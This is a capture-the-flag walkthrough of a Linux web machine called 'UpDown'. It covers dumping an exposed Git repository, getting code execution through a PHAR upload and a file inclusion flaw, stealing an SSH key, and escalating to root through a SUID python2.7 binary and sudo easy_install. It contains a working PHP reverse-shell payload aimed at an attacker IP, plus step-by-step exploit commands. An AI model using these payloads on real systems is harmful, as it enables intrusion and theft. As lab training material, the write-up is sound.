## Intro

Tags: #linux #WebApp #git #LFI #SUID #known-binary #medium

---
# Reconnaissance

## Port Scanning

A full TCP port scan reveals two open services: SSH on port 22 and HTTP on port 80.

```bash
nmap -p- --open -n -Pn -sS -vvv --min-rate 5000 10.10.11.177 -oG allPorts
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Service Version Detection

A targeted version scan identifies Ubuntu Linux with Apache 2.4.41 and OpenSSH 8.2p1.

```bash
nmap -sCV -p22,80 10.10.11.177 -oN targeted
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web App

### Adding Host Entries

The web application references `siteisup.htb`, so add the domain to `/etc/hosts`.

```bash
echo "10.10.11.177 siteisup.htb" | sudo tee -a /etc/hosts
```

### Directory Enumeration

Directory brute-forcing reveals a `/dev` directory on the web server .

```bash
gobuster dir -u http://siteisup.htb/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/dev                  (Status: 301)
```

### Subdomain Fuzzing

Fuzzing for subdomains with the Host header reveals `dev.siteisup.htb` .

```bash
ffuf -u http://siteisup.htb/ -H "Host: FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1131
```

```text
dev                     [Status: 403, Size: 281, Words: 20, Lines: 10]
```

Add the subdomain to `/etc/hosts`.

```bash
echo "10.10.11.177 dev.siteisup.htb" | sudo tee -a /etc/hosts
```

---

# Foothold

## Exposed Git Repository

Accessing `/dev/.git/HEAD` confirms an exposed Git repository .

```bash
curl -s http://siteisup.htb/dev/.git/HEAD
```

```text
ref: refs/heads/main
```

### Dumping the Repository

Use `git-dumper` to retrieve the full repository .

```bash
git-dumper http://siteisup.htb/dev/.git dev_git_dump
```

```text
[-] Fetching http://siteisup.htb/dev/.git/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/main [200]
[-] Running git checkout .
Updated 6 paths from the index
```

### Analyzing `.htaccess`

The dumped `.htaccess` reveals a custom header required to access the development vhost .

```bash
cat dev_git_dump/.htaccess
```

```text
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

## Bypassing the Header Restriction

Access the development vhost by adding the `Special-Dev: only4dev` header to requests .

```bash
curl -H "Special-Dev: only4dev" http://dev.siteisup.htb/
```

```text
<!DOCTYPE html>
...
<h1>Is my Website up ? (beta version)</h1>
```

## Analyzing `checker.php`

The development application accepts file uploads containing lists of websites to check. The source code reveals several restrictions :

```bash
cat dev_git_dump/checker.php
```

```php
if ($_FILES['file']['size'] > 10000) {
    die("File too large!");
}

if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
    die("Extension not allowed!");
}

$dir = "uploads/".md5(time())."/";
...
$final_path = $dir.$file;
move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
...
@unlink($final_path);
```
Key findings:
- File size limited to 10KB
- `.php`, `.zip`, and other extensions are blacklisted
- **`.phar` is NOT blacklisted**
- Upload directory is named after `md5(time())`
- Uploaded file is deleted after processing

## LFI
### Exploiting `phar://` Wrapper

The `index.php` reveals an LFI vulnerability via the `page` parameter :
```php
$page=$_GET['page'];
if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
    include($_GET['page'] . ".php");
}
```

### Creating the PHAR Payload

Create a PHP script that uses `proc_open()` (since `system`, `exec`, and `shell_exec` are disabled) :
```php
<?php
$descriptorspec = array(
    0 => array('pipe', 'r'),
    1 => array('pipe', 'w'),
    2 => array('pipe', 'a')
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.33/4444 0>&1'";
$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
?>
```

### Generating the PHAR Archive

```bash
php --define phar.readonly=0 -r '
$phar = new Phar("revshell.phar");
$phar->startBuffering();
$phar->addFromString("shell.php", file_get_contents("revshell.php"));
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();
'
```
Rename the `.phar` file to `.txt` to bypass the extension blacklist .
```bash
mv revshell.phar revshell.txt
```

### Uploading the Payload

```bash
curl -H "Special-Dev: only4dev" -F "file=@revshell.txt" http://dev.siteisup.htb/
```
Capture the `Date` header from the response to calculate the upload directory hash.

### Calculating the Upload Directory

The upload directory is named `md5(time())` where `time()` is the server's Unix timestamp at upload time .
```bash
# Extract Date header from upload response
INPUT_DATA='Thu, 23 Apr 2026 19:51:09 GMT'
date -d "$INPUT_DATA" +%s | tr -d '\n' | md5sum | awk '{print $1}'
```

```text
0c9ff984bd1652e5630b0d0d023fb357
```

### Triggering RCE via `phar://`

Start a listener and trigger the LFI with the `phar://` wrapper .

```bash
nc -lvnp 4444
```

```bash
curl -H "Special-Dev: only4dev" "http://dev.siteisup.htb/?page=phar://uploads/0c9ff984bd1652e5630b0d0d023fb357/revshell.txt/shell"
```
## Shell as www-data
```shell
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.177] 54321
www-data@updown:/var/www/dev$
```
stabilize shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Filesystem enumeration

### Found developer's SSH private key

The developer's SSH directory is readable by `www-data`. Use `proc_open` through the web shell to exfiltrate the private key .
```bash
cat /home/developer/.ssh/id_rsa
```

### SSH as developer

Save the key locally and SSH into the target .
```bash
chmod 600 developer_rsa
ssh -i developer_rsa developer@10.10.11.177
```

```shell
developer@updown:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer)
```
grabbed user flag

---
# Privilege Escalation

## Enumerating SUID Binaries

Search for SUID binaries on the system.
```bash
find / -perm -4000 -type f 2>/dev/null
```

```shell
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/python2.7
...
```
Check for unusual SUID binaries.
```bash
ls -la /usr/bin/python2.7
```
#### Known binary
```shell
-rwsr-xr-x 1 root root ... /usr/bin/python2.7
```

## Exploiting Python 2 `input()` Vulnerability

The SUID Python 2.7 binary's `input()` function evaluates arbitrary Python expressions .
https://gtfobins.org/gtfobins/python/
```bash
/usr/bin/python2.7 -c 'input()'
```

```python
__import__('os').system('/bin/bash')
```
got root shell!

## Alternative: sudo easy_install

Check `sudo` permissions for `developer`.
```bash
sudo -l
```

```shell
User developer may run the following commands on updown:
    (root) NOPASSWD: /usr/bin/easy_install
```

### Exploiting easy_install

https://gtfobins.org/gtfobins/easy_install/
Create a malicious `setup.py` and run it with `easy_install` .
```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
## Shell as root
```shell
root@updown:/home/developer# id
uid=0(root) gid=0(root) groups=0(root)
```
grabbed root flag

---
